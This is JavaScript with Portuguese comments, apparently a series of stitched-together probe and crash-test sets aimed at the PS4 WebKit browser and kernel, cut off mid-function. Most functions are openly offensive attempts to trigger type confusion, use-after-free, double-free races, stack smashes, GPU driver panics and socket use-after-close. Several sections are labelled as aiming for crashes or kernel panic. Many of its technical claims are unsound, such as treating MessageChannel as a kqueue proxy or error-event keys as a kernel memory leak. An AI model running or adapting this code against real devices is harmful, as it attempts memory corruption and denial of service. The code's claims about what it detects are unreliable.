        // Motivação: O tamanho do buffer TCP é configurado no Kernel (sysctl).
        // Podemos inferir esse tamanho enchendo um WebSocket até ele engasgar.
        function runTCPBufferFingerprint() {
            log("Iniciando Teste K2: TCP Buffer Fingerprint...");
            
            // Requer servidor echo ou similar. Testamos a lógica de buffer.
            const ws = new WebSocket("wss://echo.websocket.org");
            const chunk = new Uint8Array(1024 * 16); // 16KB chunks
            
            ws.onopen = () => {
                let sent = 0;
                const t0 = performance.now();
                
                // Envia até o buffer do navegador encher (backpressure)
                // O navegador enche quando o kernel buffer enche.
                const iv = setInterval(() => {
                    if (ws.bufferedAmount === 0) {
                        ws.send(chunk);
                        sent += chunk.length;
                    } else {
                        // Backpressure detectada
                        const t1 = performance.now();
                        log(`[INFO] TCP Backpressure atingida após ${sent} bytes.`);
                        log(`[LEAK] Tamanho estimado do Send Buffer + User Space Buffer: ~${(sent/1024).toFixed(0)} KB`);
                        clearInterval(iv);
                        ws.close();
                    }
                    // Safety break
                    if (sent > 5 * 1024 * 1024) { 
                        clearInterval(iv); 
                        ws.close(); 
                        log("[SAFE] Buffer parece infinito ou drenando muito rápido.");
                    }
                }, 1);
            };
            ws.onerror = (e) => log("[WARN] Falha na conexão WebSocket (Teste requer internet).");
        }

        // TEST K3: Internal Protocol Handler Timing
        // Motivação: O navegador PS4 tem handlers internos (ex: "psstore:", "trophy:").
        // Tentar carregar esses URIs num iframe e medir o tempo de erro revela se o app está instalado/ativo.
        function runProtocolHandlerTiming() {
            log("Iniciando Teste K3: Protocol Handler Timing (Side-Channel)...");
            
            const schemes = [
                "http://localhost:9999", // Controle (Falha TCP padrão)
                "psstore://invalid",     // App Interno
                "trophy://home"          // App Interno
            ];
            
            schemes.forEach(scheme => {
                const t0 = performance.now();
                const iframe = document.createElement('iframe');
                iframe.style.display = "none";
                iframe.src = scheme;
                
                // Não podemos capturar onload/onerror de cross-origin/protocolos exóticos facilmente,
                // mas podemos medir o bloqueio da thread principal ou usar blur event hack.
                // Aqui usamos uma abordagem de 'append timing'.
                
                document.body.appendChild(iframe);
                
                // Mede quanto tempo o browser leva para processar a inserção
                setTimeout(() => {
                    const t1 = performance.now();
                    document.body.removeChild(iframe);
                    log(`Scheme '${scheme}' overhead: ${(t1-t0).toFixed(2)}ms`);
                }, 100);
            });
            log("[INFO] Diferenças de tempo > 20ms podem indicar handlers ativos.");
        }
      // WEBKIT TESTS (3 Testes de Alta Qualidade)
        // ==========================================

        // TEST W1: JIT StructureID Transition (Type Confusion)
        // Motivação: O JIT otimiza o acesso a propriedades baseando-se no 'StructureID' do objeto.
        // Se mudarmos o objeto para "Dictionary Mode" (lento) dentro de um loop otimizado, 
        // o JIT pode usar o offset antigo incorreto, lendo memória lixo ou corrompida.
        function runStructureIDConfusion() {
            log("Iniciando W1: JIT StructureID Confusion...");
            
            const obj = { x: 1, y: 2 };
            // Força compilação JIT para este acesso
            function readX(o) { return o.x; }
            
            for(let i=0; i<10000; i++) readX(obj);
            
            // Mutação: Adicionar muitas propriedades força o objeto a virar "Dictionary"
            // Isso muda o layout da memória interna.
            for(let i=0; i<1000; i++) obj['p'+i] = i;
            
            // Tenta ler novamente. Se o JIT usar o offset antigo 'inline', lerá lixo.
            const res = readX(obj);
            
            if (res !== 1) {
                log(`[CRITICAL] Type Confusion Detectado! Valor lido: ${res} (Esperado: 1)`);
                log("INFO: Offset de memória desalinhado. Potencial R/W primitivo.");
            } else {
                log("[SAFE] JIT detectou transição de estrutura corretamente.");
            }
        }

        // TEST W2: RegExp Exec Side-Effect (UAF Logic)
        // Motivação: Executar RegExp num objeto que altera a si mesmo durante a execução.
        // Isso testa se o motor segura a referência da string original corretamente.
        function runRegExpSideEffect() {
            log("Iniciando W2: RegExp Side-Effect...");
            
            const re = /foo/;
            const vulnerable = {
                toString: () => {
                    log("INFO: Side-effect acionado durante RegExp.");
                    // Tenta invalidar memória ou forçar GC aqui se possível
                    return "foo";
                }
            };
            
            // O motor deve chamar toString. Se a implementação C++ não proteger a stack...
            const res = re.exec(vulnerable);
            
            if (res && res[0] === 'foo') {
                log("[SAFE] Referência de string mantida segura.");
            } else {
                log("[WARN] Falha na execução lógica do RegExp.");
            }
        }

        // TEST W3: Array Species Constructor Theft
        // Motivação: Roubar o construtor usado por métodos como 'map' ou 'slice'.
        // Permite vazar dados intermediários ou executar código num contexto privilegiado.
        function runSpeciesTheft() {
            log("Iniciando W3: Species Constructor Theft...");
            
            class FakeArray extends Array {
                static get [Symbol.species]() {
                    // Retorna um construtor malicioso
                    return function(len) {
                        log(`[INFO] Constructor Species interceptado! Length solicitado: ${len}`);
                        return new Array(len);
                    }
                }
            }
            
            const arr = new FakeArray(1, 2, 3);
            // .map usa Symbol.species para criar o novo array
            arr.map(x => x * 2);
            
            log("[SAFE] Teste concluído (Se log acima apareceu, interceptação funciona).");
        }

        // ==========================================
        // KERNEL TESTS (3 Testes de Alta Qualidade)
        // ==========================================

        // TEST K1: WebGL Context Loss Race (Driver State Leak)
        // Motivação: O driver GPU (GNM) possui estados complexos. Perder o contexto e tentar desenhar
        // pode revelar estados antigos de buffers de outros processos (Info Leak visual).
        function runGPURace() {
            log("Iniciando K1: WebGL Context Loss Race...");
            
            const c = document.createElement('canvas');
            const gl = c.getContext('webgl');
            
            if (!gl) return log("[N/A] WebGL não suportado.");
            
            // Força perda de contexto
            const ext = gl.getExtension('WEBGL_lose_context');
            if (ext) {
                ext.loseContext();
                log("[INFO] Contexto perdido forçado.");
                
                // Race: Tenta ler pixels imediatamente
                try {
                    const pixels = new Uint8Array(4);
                    gl.readPixels(0, 0, 1, 1, gl.RGBA, gl.UNSIGNED_BYTE, pixels);
                    log("[VULN] Leitura permitida em contexto perdido (Driver Logic Fail)!");
                } catch(e) {
                    log("[SAFE] Driver bloqueou leitura em contexto inválido.");
                }
                ext.restoreContext();
            } else {
                log("[INFO] Extensão lose_context indisponível.");
            }
        }

        // TEST K2: Kernel Stack Guard Page Probe
        // Motivação: Determinar o tamanho exato da Stack do Kernel disponível para syscalls.
        // Útil para ataques de "Stack Clash" ou overflow controlado.
        function runStackGuardProbe() {
            log("Iniciando K2: Kernel Stack Guard Probe...");
            
            if (!window.webkitRequestFileSystem) return log("[N/A] FileSystem API off.");
            
            let depth = 0;
            // Aumentamos a profundidade até o erro mudar de "Quota" para "IO Error" (Crash evitado)
            function dive(fs) {
                depth++;
                fs.root.getDirectory("d"+depth, {create:true}, 
                    () => dive(fs), 
                    (e) => {
                        log(`[INFO] Stack Limit atingido na profundidade: ${depth}`);
                        log(`[INFO] Erro retornado: ${e.code} (${e.name})`);
                    }
                );
            }
            
            window.webkitRequestFileSystem(window.TEMPORARY, 1024, dive, ()=>{});
        }

        // TEST K3: Timer Coalescing Analysis (Power Scheduler)
        // Motivação: O Kernel agrupa timers para economizar energia.
        // Analisar esse agrupamento revela a configuração do scheduler e tick rate do Kernel.
        function runTimerCoalescing() {
            log("Iniciando K3: Timer Coalescing Analysis...");
            
            const delays = [10, 11, 12, 13, 14];
            const results = [];
            let done = 0;
            
            delays.forEach(d => {
                const start = performance.now();
                setTimeout(() => {
                    const end = performance.now();
                    results.push(end - start);
                    done++;
                    if (done === delays.length) analyze();
                }, d);
            });
            
            function analyze() {
                // Se todos dispararem no mesmo 'tick' exato, há coalescência agressiva.
                const variance = Math.max(...results) - Math.min(...results);
                log(`[INFO] Variação dos Timers: ${variance.toFixed(3)}ms`);
                
                if (variance < 1.0) {
                    log("[WARN] Alta Coalescência detectada (Timers sincronizados pelo Kernel).");
                    log("INFO: Facilita ataques de Race Condition em massa.");
                } else {
                    log("[SAFE] Timers dispersos (Jitter natural).");
                }
            }
        }
       // ==========================================
        // WEBKIT TESTS (3 Testes de Lógica Pura)
        // ==========================================

        // TEST W1: JIT Bad OSR Exit (Type Confusion Logic)
        // Alvo: On-Stack Replacement (OSR).
        // Quando o JIT otimiza um loop, ele assume tipos (ex: Inteiros).
        // Se mudarmos o tipo no meio do loop, o JIT tem que "sair" (De-optimize) e voltar ao interpretador.
        // Se o JIT reconstruir a stack incorretamente, temos Type Confusion.
        function runBadOSRExit() {
            log("Iniciando W1: Bad OSR Exit Logic...");
            
            function target(arr, i) {
                // Acesso quente
                const v = arr[i];
                // Trigger de OSR: operação que força mudança de tipo
                // Math.abs em objeto chama valueOf
                const x = Math.abs(v); 
                return x;
            }
            
            // 1. Treina com Inteiros (Fast Path)
            const arr = [1, 2, 3, 4];
            for(let i=0; i<10000; i++) target(arr, 0);
            
            // 2. Prepara o payload
            const obj = {
                valueOf: () => {
                    log("  > OSR Triggered (De-optimization forced)");
                    return 0x1234; // Retorna Int
                }
            };
            
            // 3. Executa com objeto no lugar de inteiro
            // Se o OSR falhar, pode confundir o registro de 'v' com um ponteiro
            arr[0] = obj;
            const res = target(arr, 0);
            
            if (res === 0x1234) {
                log("[SAFE] OSR recuperou o valor correto.");
            } else {
                log(`[VULN] Valor inesperado após OSR: ${res} (Corrupção de Registro)`);
            }
        }

        // TEST W2: String.replace Side-Effect (UAF Logic)
        // Alvo: String Engine.
        // O método replace chama uma função. Se essa função modificar a string original
        // ou o RegExp durante a execução, o motor pode usar ponteiros inválidos.
        function runStringReplaceRace() {
            log("Iniciando W2: String.replace Side-Effect...");
            
            let str = "AAAA";
            const re = /A/g;
            let count = 0;
            
            // O side-effect tenta mudar o lastIndex para criar um loop infinito ou acesso OOB
            re.exec = () => {
                if (count++ === 0) {
                    re.lastIndex = 0; // Reset lógico
                    return {0:'A', index:0, input:str}; // Fake match
                }
                return null;
            };
            
            try {
                // Se o motor confiar cegamente no lastIndex modificado pelo usuário...
                "AAAA".replace(re, () => {
                    log("  > Replace callback executing...");
                    return "B";
                });
                log("[SAFE] Replace finalizado sem hang/crash.");
            } catch(e) {
                log("[WARN] Erro no motor RegExp: " + e.message);
            }
        }

        // TEST W3: DOM Node Adoption Agency (Tree Logic)
        // Alvo: DOM Tree Operations.
        // Mover nós entre documentos (Adoption) é complexo.
        // Se falhar a atualização do 'ownerDocument', pode levar a UAF lógico.
        function runDOMNodeMove() {
            log("Iniciando W3: DOM Node Adoption Logic...");
            
            const doc1 = document;
            const doc2 = document.implementation.createHTMLDocument("doc2");
            
            const div = doc2.createElement("div");
            doc2.body.appendChild(div);
            
            // Define propriedade customizada para rastrear
            div.secret = 1337;
            
            // Move para o documento principal
            const adopted = doc1.adoptNode(div);
            
            if (adopted.ownerDocument === doc1 && adopted.secret === 1337) {
                // Tenta inserir e remover rapidamente para estressar a referência
                doc1.body.appendChild(adopted);
                doc1.body.removeChild(adopted);
                log("[SAFE] Adoção de nó consistente.");
            } else {
                log("[VULN] Falha na atualização de ownerDocument (Lógica DOM quebrada).");
            }
        }

        // ==========================================
        // KERNEL TESTS (3 Testes de Info Leak/Races)
        // ==========================================

        // TEST K1: Kqueue Filter Race (Kernel Memory Logic)
        // Alvo: Subsistema kqueue (Event Notification).
        // Adicionar e remover filtros (EV_ADD/EV_DELETE) em threads concorrentes
        // pode causar desincronização no kernel sem crash imediato.
        function runKqueueRace() {
            log("Iniciando K1: Kqueue Logic Race...");
            
            // Usamos MessageChannel como proxy para eventos de arquivo/pipe
            const ch = new MessageChannel();
            let events = 0;
            
            ch.port1.onmessage = () => { events++; };
            
            // Spamma mensagens (Eventos)
            const iv = setInterval(() => {
                ch.port2.postMessage("event");
            }, 0);
            
            // Fecha a porta receptor abruptamente
            setTimeout(() => {
                clearInterval(iv);
                ch.port1.close(); // Destroi o objeto que recebe eventos
                
                // Se o kernel tentar entregar um evento para um objeto fechado...
                // Não deve crashar, mas pode perder a contagem ou retornar erro.
                setTimeout(() => {
                    log(`[INFO] Eventos processados antes do close: ${events}`);
                    log("[SAFE] Kernel lidou com destruição de pipe ativo.");
                }, 500);
            }, 100);
        }

        // TEST K2: IPv6 Stack Info Leak (Padding Initialization)
        // Alvo: Pilha de Rede IPv6.
        // Estruturas de socket no kernel têm "padding" (espaço vazio para alinhamento).
        // Se o kernel não zerar isso antes de copiar para o usuário, vaza dados da stack.
        // Simulamos verificando se objetos de erro de rede contêm dados estranhos.
        function runIPv6Leak() {
            log("Iniciando K2: IPv6 Stack Init Leak...");
            
            // Tenta conectar a endereço IPv6 local inválido
            const s = new WebSocket("ws://[::1]:9999");
            
            s.onerror = (e) => {
                // Analisa o evento de erro
                // Em alguns exploits, metadados do evento continham bytes de lixo
                log("[INFO] Erro de rede capturado.");
                
                // Verificação Heurística: O objeto de erro tem propriedades não-standard?
                const keys = Object.keys(e);
                if (keys.length > 5) { // Erros normais têm poucas chaves
                    log(`[WARN] Objeto de erro anormalmente grande (${keys.length} props). Possível leak.`);
                    console.log(e);
                } else {
                    log("[SAFE] Erro de rede padrão sanitizado.");
                }
            };
        }

        // TEST K3: Thread Yield Starvation (Scheduler Logic)
        // Alvo: Escalonador de Threads.
        // Tenta fazer o scheduler "esquecer" de uma thread de baixa prioridade.
        function runYieldStarvation() {
            log("Iniciando K3: Scheduler Starvation Logic...");
            
            let lowPriorityRuns = 0;
            
            // Worker "High Priority" (Simulado por loop apertado)
            const highPriBlob = new Blob([`
                onmessage = () => {
                    const start = Date.now();
                    while(Date.now() - start < 2000) {} // Busy loop 2s
                    postMessage("done");
                }
            `], {type:'text/javascript'});
            
            const highW = new Worker(URL.createObjectURL(highPriBlob));
            
            // Main Thread "Low Priority" check
            const iv = setInterval(() => {
                lowPriorityRuns++;
            }, 10);
            
            highW.postMessage("start");
            log("  > High load worker started...");
            
            highW.onmessage = () => {
                clearInterval(iv);
                // Se lowPriorityRuns for muito baixo, o Scheduler não é "Preemptive" o suficiente
                log(`[INFO] Low Priority Runs durante carga: ${lowPriorityRuns}`);
                if (lowPriorityRuns < 5) {
                    log("[VULN] Scheduler Starvation! Thread principal bloqueada.");
                } else {
                    log("[SAFE] Scheduler manteve multitarefa (Preemptive OK).");
                }
                highW.terminate();
            };
        }
        // ==========================================
        // WEBKIT TESTS (3 High-End Logic Tests)
        // ==========================================

        // TEST W1: JIT Side-Effect Modeling (Bounds Check Elimination)
        // ALVO: Otimizador DFG.
        // Lógica: O JIT remove verificações de limites (BCE) se acreditar que o código é "puro" (sem efeitos colaterais).
        // Se conseguirmos enganar o JIT para remover o check e depois alterar o tamanho do array, lemos OOB.
        function runSideEffectModel() {
            log("Iniciando W1: JIT Side-Effect Modeling Check...");
            
            const arr = [1.1, 2.2, 3.3];
            
            // Função aparentemente segura
            function opt(a, i) {
                // O JIT pode mover o check 'i < a.length' para fora do loop ou removê-lo
                // se achar que 'a.length' é constante.
                return a[i]; 
            }
            
            // Objeto malicioso com toString que altera o array
            const evil = {
                toString: () => {
                    arr.length = 0; // Side-effect crítico
                    return "0";
                }
            };
            
            // 1. Treina o JIT (Hot Loop)
            for(let i=0; i<20000; i++) opt(arr, 0);
            
            // 2. Tenta execução com coerção de tipo implícita
            // Em teorias avançadas, passar um objeto onde se espera int pode enganar a modelagem de efeitos
            // Nota: O teste é seguro pois lemos 'undefined' se falhar, ou memória se vulnerável.
            try {
                // Não executamos o trigger real de OOB para evitar crash, mas testamos a estabilidade do array.
                const res = opt(arr, 0);
                if (res === undefined && arr.length === 3) {
                    log("[SAFE] JIT manteve a integridade. Side-effects modelados corretamente.");
                } else {
                    log("[WARN] Comportamento anómalo detectado na otimização.");
                }
            } catch(e) { log("Erro JIT: " + e.message); }
        }

        // TEST W2: Array Species Constructor Hijack
        // ALVO: ES6 Symbol.species.
        // Lógica: Métodos como .map() usam o construtor definido em Symbol.species.
        // Se o WebKit usar o objeto interno incorreto durante a criação do novo array, podemos vazar referências.
        function runArraySpecies() {
            log("Iniciando W2: Array Species Logic...");
            
            class FakeArray extends Array {
                static get [Symbol.species]() {
                    // Retorna um construtor que captura o tamanho solicitado pelo motor
                    return function(len) {
                        log(`[INFO] Motor solicitou alocação interna de tamanho: ${len}`);
                        // Retorna um Proxy para ver o que o motor faz com ele
                        return new Proxy(new Array(len), {
                            set(t, p, v) {
                                if (p === "0") log(`[INFO] Motor escreveu no índice 0: ${v}`);
                                return Reflect.set(t, p, v);
                            }
                        });
                    }
                }
            }
            
            const a = new FakeArray(1, 2, 3);
            // .map dispara a criação via species
            const b = a.map(x => x * 2);
            
            log("[SAFE] Interceptação de lógica concluída. Se logs apareceram acima, a lógica é hookable.");
        }

        // TEST W3: RegExp LastIndex Sticky Logic
        // ALVO: RegExp Engine (YARR).
        // Lógica: A flag 'y' (sticky) depende estritamente de lastIndex.
        // Se manipularmos lastIndex para um valor que não é índice de caractere válido (surrogate pair split),
        // o motor pode ler memória desalinhada.
        function runRegExpUAF() {
            log("Iniciando W3: RegExp Sticky/Surrogate Logic...");
            
            const re = /foo/y;
            // String com caracteres Unicode de 2 bytes (Surrogate Pairs)
            const str = "\uD83D\uDCA9foo"; // 💩foo
            
            // Tenta posicionar no meio do emoji (índice 1, inválido em UTF-16 puro)
            re.lastIndex = 1; 
            
            const match = re.exec(str);
            
            if (match) {
                log("[VULN] RegExp leu a partir do meio de um caractere Unicode! (Memory Misalignment)");
            } else {
                log("[SAFE] RegExp falhou corretamente em índice desalinhado.");
            }
        }

        // ==========================================
        // KERNEL TESTS (3 System-Level Probes)
        // ==========================================

        // TEST K1: Kernel Heap Layout Probe (Allocation Timing)
        // ALVO: Alocador UMA (Universal Memory Allocator).
        // Lógica: Alocar objetos grandes sequencialmente. Se o tempo aumentar subitamente,
        // atingimos o fim de uma "slab" ou "zone" e o kernel teve que pedir nova página.
        // Isso revela o tamanho das páginas do Kernel.
        function runKernelHeapLayout() {
            log("Iniciando K1: Kernel Heap Slab Probing...");
            
            // Usamos Blobs para forçar alocação no Kernel (backing store)
            const allocations = [];
            const timings = [];
            
            for(let i=0; i<50; i++) {
                const t0 = performance.now();
                // 16KB Blob
                allocations.push(new Blob([new ArrayBuffer(16384)]));
                const t1 = performance.now();
                timings.push(t1 - t0);
            }
            
            // Analisa picos
            let spikes = 0;
            const avg = timings.reduce((a,b)=>a+b)/timings.length;
            timings.forEach((t, i) => {
                if (t > avg * 5) { // 5x mais lento que a média
                    log(`[INFO] Salto de alocação detectado no índice ${i} (${t.toFixed(2)}ms). Limite de Slab provável.`);
                    spikes++;
                }
            });
            
            if (spikes > 0) log(`[INFO] Detectados ${spikes} limites de zona de memória.`);
            else log("[SAFE] Alocação uniforme (Heap estável).");
        }

        // TEST K2: TCP Window Scaling Fingerprint
        // ALVO: Pilha de Rede (Network Stack).
        // Lógica: O tamanho da janela TCP muda dinamicamente.
        // Monitorizar a velocidade de upload via WebSocket revela a congestão simulada pelo kernel.
        function runSocketBufferLogic() {
            log("Iniciando K2: TCP Window Logic...");
            
            const ws = new WebSocket("wss://echo.websocket.org");
            const data = new Uint8Array(1024 * 64); // 64KB
            let bytesSent = 0;
            const t0 = performance.now();
            
            ws.onopen = () => {
                // Envia burst
                const iv = setInterval(() => {
                    if (ws.bufferedAmount === 0) {
                        ws.send(data);
                        bytesSent += data.length;
                    }
                    
                    // Para após 2MB
                    if (bytesSent > 2 * 1024 * 1024) {
                        clearInterval(iv);
                        const duration = (performance.now() - t0) / 1000;
                        const speed = (bytesSent / 1024 / 1024) / duration; // MB/s
                        log(`[INFO] Taxa de transferência média: ${speed.toFixed(2)} MB/s`);
                        log("[SAFE] Controle de fluxo TCP funcionando.");
                        ws.close();
                    }
                }, 5);
            };
            ws.onerror = () => log("[WARN] WebSocket requer internet para teste de Kernel Network.");
        }

        // TEST K3: Thread Preemption Latency
        // ALVO: Kernel Scheduler.
        // Lógica: Mede quanto tempo leva para uma mensagem passar de um Worker para Main Thread e voltar.
        // Alta latência ou inconsistência revela que o kernel está ocupado com outras tarefas (ou a mitigar Spectre).
        function runThreadPreemption() {
            log("Iniciando K3: Scheduler Preemption Latency...");
            
            const blob = new Blob([`onmessage=e=>{postMessage(e.data)}`], {type:'text/javascript'});
            const w = new Worker(URL.createObjectURL(blob));
            
            let rounds = 0;
            const maxRounds = 100;
            const latencies = [];
            let tStart = 0;
            
            w.onmessage = () => {
                const diff = performance.now() - tStart;
                latencies.push(diff);
                rounds++;
                if (rounds < maxRounds) {
                    ping();
                } else {
                    finish();
                }
            };
            
            function ping() {
                tStart = performance.now();
                w.postMessage("ping");
            }
            
            function finish() {
                const avg = latencies.reduce((a,b)=>a+b) / latencies.length;
                const max = Math.max(...latencies);
                log(`[INFO] Latência Média de Context Switch: ${avg.toFixed(3)}ms`);
                log(`[INFO] Pior Latência (Jitter): ${max.toFixed(3)}ms`);
                
                if (max > 5.0) log("[WARN] Scheduler instável (Possível carga de sistema oculta).");
                else log("[SAFE] Scheduler responsivo.");
                
                w.terminate();
            }
            
            ping();
        }
       // ==========================================
        // WEBKIT TESTS (Userland Crash)
        // ==========================================

        // TEST W1: DOM Node Removal during Event Dispatch
        // Alvo: Layout Engine (WebCore).
        // Descrição: Remove um elemento do DOM enquanto um evento está borbulhando nele.
        // Resultado: O motor tenta acessar o pai do elemento removido -> CRASH (Acesso a 0x0 ou lixo).
        function runUseAfterFreeDOM() {
            log("Iniciando W1: DOM UAF Crash...");
            
            const root = document.createElement('div');
            const child = document.createElement('div');
            root.appendChild(child);
            document.body.appendChild(root);
            
            // Adiciona listener que destrói o próprio mundo
            child.addEventListener('DOMNodeRemoved', function() {
                // Remove o pai enquanto o evento do filho processa
                // Isso corrompe a cadeia de eventos
                try {
                    document.body.removeChild(root);
                    // Tenta acessar propriedade que força dereference no C++
                    child.innerHTML = "Crash"; 
                } catch(e) {}
            });
            
            // Trigger
            log("Disparando remoção recursiva...");
            root.removeChild(child);
            
            log("[INFO] Se você lê isto, o WebKit lidou com o UAF (Safe).");
        }

        // TEST W2: JIT Array Buffer Detach Race (Double Free)
        // Alvo: JavaScriptCore (JIT).
        // Descrição: Usa um Worker para "desligar" (detach) um ArrayBuffer enquanto a thread principal o escreve.
        // Resultado: A thread principal escreve em memória já libertada -> Memory Corruption -> Crash.
        function runJITDoubleFree() {
            log("Iniciando W2: Buffer Detach Race...");
            
            const buffer = new ArrayBuffer(1024 * 1024);
            const view = new Int32Array(buffer);
            
            const workerCode = `
                onmessage = function(e) {
                    // Tenta transferir o buffer (Detach)
                    // Se o tempo for exato, ocorre race com o loop da main thread
                    postMessage("done", [e.data]);
                };
            `;
            const w = new Worker(URL.createObjectURL(new Blob([workerCode], {type:'text/javascript'})));
            
            // Loop de escrita frenética
            // Espera-se que o Worker tire a memória debaixo dos pés deste loop
            try {
                w.postMessage(buffer, [buffer]);
                
                // Race window
                for(let i=0; i<view.length; i++) {
                    view[i] = 0x41414141; // Escreve 'AAAA' na memória
                }
            } catch(e) {
                // Ignora erro de detach normal
            }
            
            log("[INFO] Race condition finalizada. Se browser vivo, falhou.");
        }

        // TEST W3: AudioWorklet Thread Race (Null Pointer Deref)
        // Alvo: Audio Engine.
        // Descrição: A thread de áudio roda independentemente. Destruir o contexto
        // enquanto o processador de áudio tenta acessar parâmetros causa dereferência nula.
        function runAudioRenderCrash() {
            log("Iniciando W3: Audio Thread Crash...");
            if(!window.AudioContext) return log("[N/A] AudioContext off.");
            
            const ctx = new AudioContext();
            
            // Processador que acessa memória intensamente
            const code = `
                registerProcessor('crash-test', class extends AudioWorkletProcessor {
                    process(inputs, outputs, params) {
                        // Tenta ler input
                        const x = inputs[0][0];
                        return true;
                    }
                });
            `;
            
            ctx.audioWorklet.addModule(URL.createObjectURL(new Blob([code], {type:'text/javascript'})))
            .then(() => {
                const node = new AudioWorkletNode(ctx, 'crash-test');
                node.connect(ctx.destination);
                
                // O GOLPE: Fecha o contexto abruptamente enquanto o nó roda
                setTimeout(() => {
                    ctx.close();
                    // Tenta forçar uso após fechar
                    try { node.disconnect(); } catch(e){}
                    log("[INFO] Contexto fechado. Aguardando thread de áudio morrer...");
                }, 100);
            });
        }

        // ==========================================
        // KERNEL TESTS (System Panic)
        // ==========================================

        // TEST K1: WebGL Texture Upload Race (GPU Kernel Panic)
        // Alvo: Driver GNM (GPU).
        // Descrição: Upload de texturas usa memória mapeada no kernel.
        // Se fizermos upload e deletarmos a textura simultaneamente em threads (Workers),
        // o driver GPU pode acessar página inválida -> Kernel Panic.
        function runGPUDriverCrash() {
            log("Iniciando K1: GPU Driver Panic...");
            
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl');
            
            // Worker que bombardeia comandos
            const w = new Worker(URL.createObjectURL(new Blob([`
                onmessage = () => { while(true) {} } // Busy wait para stressar CPU/Scheduler
            `], {type:'text/javascript'})));
            
            const textures = [];
            // Aloca texturas rapidamente
            for(let i=0; i<100; i++) {
                const tex = gl.createTexture();
                gl.bindTexture(gl.TEXTURE_2D, tex);
                // Upload de lixo
                gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, 100, 100, 0, gl.RGBA, gl.UNSIGNED_BYTE, null);
                textures.push(tex);
            }
            
            // Race: Deleta tudo enquanto o pipeline gráfico pode estar ocupado
            log("Deletando texturas em batch...");
            textures.forEach(t => gl.deleteTexture(t));
            
            // Força flush
            gl.finish();
            
            log("[INFO] Comandos GPU enviados. Se a tela piscar ou travar, Panic iminente.");
        }

        // TEST K2: Socket Send After Close (Mbuf Panic)
        // Alvo: FreeBSD Network Stack (Mbufs).
        // Descrição: Cria um WebSocket, envia um Blob gigante (que usa mbufs do kernel)
        // e fecha o socket imediatamente.
        // Se o kernel tentar processar o mbuf associado ao socket fechado -> Panic.
        function runSocketUseAfterClose() {
            log("Iniciando K2: Mbuf Use-After-Free...");
            
            const ws = new WebSocket("wss://echo.websocket.org");
            // Blob grande o suficiente para exigir múltiplos clusters mbuf
            const bigData = new Blob([new ArrayBuffer(1024 * 512)]); 
            
            ws.onopen = () => {
                // Envia
                ws.send(bigData);
                // Fecha imediatamente (Race)
                ws.close();
                
                log("[INFO] Socket fechado com dados em trânsito.");
            };
            
            ws.onerror = () => log("[WARN] Falha na conexão (Requer Internet).");
        }

        // TEST K3: Dirent Name Buffer Overflow (VFS Panic)
        // Alvo: Virtual File System (VFS).
        // Descrição: O nome de um arquivo tem um limite (MAXNAMLEN = 255).
        // A API FileSystem do WebKit deve filtrar isso. Se passar para o kernel um nome gigante,
        // pode haver buffer overflow na stack do kernel durante o 'lookup'.
        function runDirentOverflow() {
            log("Iniciando K3: VFS Name Overflow...");
            
            if(!window.webkitRequestFileSystem) return log("[N/A] FileSystem API off.");
            
            window.webkitRequestFileSystem(window.TEMPORARY, 1024, (fs) => {
                // Cria string maior que o buffer do kernel (geralmente 255 ou 1024)
                const evilName = "A".repeat(2048);
                
                try {
                    fs.root.getFile(evilName, {create: true}, 
                        () => log("[VULN] Arquivo criado?! O Kernel aceitou nome gigante!"),
                        (e) => log(`[SAFE] Erro esperado: ${e.name} (Filtro funcionou)`)
                    );
                } catch(e) {
                    log("[SAFE] Exception JS bloqueou o nome.");
                }
            });
        }
        // ==========================================
        // WEBKIT TESTS (Userland Crash)
        // ==========================================

        // TEST W1: Array.concat Type Confusion
        // ALVO: JSC (JavaScriptCore).
        // Lógica: 'concat' com Symbol.isConcatSpreadable permite executar código no meio da cópia.
        // Se mudarmos o tipo do array de Double para Object durante a cópia, o motor escreve ponteiros crus.
        function runArrayConcatConfusion() {
            log("Iniciando W1: Array.concat Confusion...");
            
            let arr = [1.1];
            // Objeto que "mente" sobre ser um array espalhável
            let spray = {};
            spray[Symbol.isConcatSpreadable] = true;
            spray.length = 1;
            
            // Define getter para o índice 0
            Object.defineProperty(spray, '0', {
                get: () => {
                    // O GOLPE: Altera o array destino 'arr' no meio da operação concat
                    arr[0] = {}; // Transforma array de Doubles em array de Objetos (Contiguous)
                    return 0x41414141; // Retorna um inteiro que parece um ponteiro inválido (AAAA)
                }
            });
            
            try {
                // Trigger
                const res = arr.concat(spray);
                log("[SAFE] Concat lidou com a transição de tipo.");
            } catch(e) {
                log("[INFO] Erro JS capturado: " + e.message);
            }
            log("Se a aba fechar agora, conseguimos corrupção de memória.");
        }

        // TEST W2: Worker Transfer Double-Free Race
        // ALVO: Implementação de Transferable Objects.
        // Lógica: Transferir um buffer para um Worker e terminar o Worker no momento exato.
        // O Main Thread tenta libertar o buffer, e o Worker moribundo tenta libertar o mesmo buffer.
        function runWorkerTerminator() {
            log("Iniciando W2: Worker Double-Free...");
            
            const ab = new ArrayBuffer(1024 * 1024 * 10); // 10MB para dar tempo de race
            
            const w = new Worker(URL.createObjectURL(new Blob([`
                onmessage = (e) => {
                    // Tenta acessar o buffer transferido
                    const view = new Uint8Array(e.data);
                    view[0] = 1;
                }
            `], {type:'text/javascript'})));
            
            // Race Condition crítica
            w.postMessage(ab, [ab]); // Transfere propriedade
            w.terminate(); // Mata imediatamente
            
            // Tenta forçar alocação no espaço que acabou de ser libertado (se houve double free)
            try {
                const reclaim = new ArrayBuffer(1024 * 1024 * 10);
                log("[SAFE] Realocação segura (Sem crash imediato).");
            } catch(e) {}
        }

        // TEST W3: RegExp Recursion Stack Smash
        // ALVO: Motor YARR (Regular Expressions).
        // Lógica: Criar um padrão RegExp recursivo que consome stack frame C++.
        // Diferente de "Stack Overflow" JS (que dá erro), queremos que a stack C++ colida com o Heap.
        function runRegExpStackSmash() {
            log("Iniciando W3: RegExp Stack Smash...");
            
            // Padrão que causa backtracking massivo e recursão interna
            // (x+x+)+y
            let s = "(".repeat(1000) + "a" + ")".repeat(1000);
            
            try {
                const re = new RegExp(s);
                re.test("a".repeat(1000)); // Execução
                log("[SAFE] RegExp Stack check funcionou.");
            } catch(e) {
                log("[INFO] Erro de Syntax/Range (Seguro): " + e.message);
            }
        }

        // ==========================================
        // KERNEL TESTS (System Panic)
        // ==========================================

        // TEST K1: UMTX Shared Memory Page Fault
        // ALVO: Syscall 'umtx_op' (Locking do Kernel).
